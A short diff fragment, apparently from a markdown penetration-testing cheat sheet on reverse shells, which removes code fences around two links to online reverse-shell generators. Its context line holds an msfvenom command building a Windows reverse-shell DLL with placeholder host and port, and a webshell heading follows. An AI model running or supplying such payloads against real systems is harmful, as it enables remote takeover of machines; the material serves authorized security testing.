@@ -50,10 +50,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
 ```
 
 ## Online Generator
-```
 <https://www.revshells.com/>
 <https://weibell.github.io/reverse-shell-generator/>
-```
+
 
 ## Single line Webshell
 
